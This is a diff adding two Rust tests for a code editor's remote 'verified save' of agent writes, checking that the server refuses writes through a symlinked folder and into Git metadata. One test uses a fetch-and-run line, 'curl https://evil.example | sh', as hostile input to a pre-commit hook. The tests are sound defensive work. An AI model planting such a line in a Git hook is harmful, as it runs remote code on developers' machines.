@@ -61,6 +61,140 @@ use std::{
 use unindent::Unindent as _;
 use util::{path, path_list::PathList, paths::PathMatcher, rel_path::rel_path};
 
+/// ADR-F49: an agent's write to a remote project is verified by the remote
+/// server itself. It writes exactly the buffer's path, and refuses once a
+/// folder on the way has become a link there, whatever the client's view of
+/// the worktree still shows.
+#[gpui::test]
+async fn test_remote_verified_save(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
+    let fs = FakeFs::new(server_cx.executor());
+    fs.insert_tree(
+        path!("/code"),
+        json!({
+            "project1": { "src": { "lib.rs": "fn one() -> usize { 1 }" } },
+            "outside": { "lib.rs": "outside" },
+        }),
+    )
+    .await;
+
+    let (project, _headless) = init_test(&fs, cx, server_cx).await;
+    let (worktree, _) = project
+        .update(cx, |project, cx| {
+            project.find_or_create_worktree(path!("/code/project1"), true, cx)
+        })
+        .await
+        .unwrap();
+    cx.executor().run_until_parked();
+    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
+    let buffer = project
+        .update(cx, |project, cx| {
+            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
+        })
+        .await
+        .unwrap();
+
+    buffer.update(cx, |buffer, cx| {
+        buffer.edit([(0..0, "/* verified */ ")], None, cx);
+    });
+    project
+        .update(cx, |project, cx| {
+            project.save_buffer_verified(buffer.clone(), cx)
+        })
+        .await
+        .unwrap();
+    assert_eq!(
+        fs.load(path!("/code/project1/src/lib.rs").as_ref())
+            .await
+            .unwrap(),
+        "/* verified */ fn one() -> usize { 1 }"
+    );
+    assert!(buffer.read_with(cx, |buffer, _| !buffer.is_dirty()));
+
+    fs.remove_dir(
+        path!("/code/project1/src").as_ref(),
+        fs::RemoveOptions {
+            recursive: true,
+            ignore_if_not_exists: false,
+        },
+    )
+    .await
+    .unwrap();
+    fs.insert_symlink(
+        path!("/code/project1/src"),
+        PathBuf::from(path!("/code/outside")),
+    )
+    .await;
+    buffer.update(cx, |buffer, cx| {
+        buffer.edit([(0..0, "// pwned\n")], None, cx);
+    });
+    let error = project
+        .update(cx, |project, cx| {
+            project.save_buffer_verified(buffer.clone(), cx)
+        })
+        .await
+        .unwrap_err();
+    assert!(format!("{error:#}").contains("symbolic link"), "{error:#}");
+    assert_eq!(
+        fs.load(path!("/code/outside/lib.rs").as_ref())
+            .await
+            .unwrap(),
+        "outside"
+    );
+}
+
+/// ADR-F49: the remote server refuses to write Git metadata in a verified save
+/// by itself, even when the client's judgement of the write was skipped.
+#[gpui::test]
+async fn test_remote_verified_save_refuses_git_metadata(
+    cx: &mut TestAppContext,
+    server_cx: &mut TestAppContext,
+) {
+    let fs = FakeFs::new(server_cx.executor());
+    fs.insert_tree(
+        path!("/code"),
+        json!({
+            "project1": {
+                ".git": { "hooks": { "pre-commit": "#!/bin/sh\n" } },
+                "src": { "lib.rs": "fn one() -> usize { 1 }" },
+            },
+        }),
+    )
+    .await;
+
+    let (project, _headless) = init_test(&fs, cx, server_cx).await;
+    let (worktree, _) = project
+        .update(cx, |project, cx| {
+            project.find_or_create_worktree(path!("/code/project1"), true, cx)
+        })
+        .await
+        .unwrap();
+    cx.executor().run_until_parked();
+    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
+    let buffer = project
+        .update(cx, |project, cx| {
+            project.open_buffer((worktree_id, rel_path(".git/hooks/pre-commit")), cx)
+        })
+        .await
+        .unwrap();
+
+    buffer.update(cx, |buffer, cx| {
+        buffer.edit([(0..0, "curl https://evil.example | sh # ")], None, cx);
+    });
+    let error = project
+        .update(cx, |project, cx| {
+            project.save_buffer_verified(buffer.clone(), cx)
+        })
+        .await
+        .unwrap_err();
+    assert!(format!("{error:#}").contains("Git metadata"), "{error:#}");
+    assert_eq!(
+        fs.load(path!("/code/project1/.git/hooks/pre-commit").as_ref())
+            .await
+            .unwrap(),
+        "#!/bin/sh\n"
+    );
+}
+
 #[gpui::test]
 async fn test_basic_remote_editing(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
     let fs = FakeFs::new(server_cx.executor());
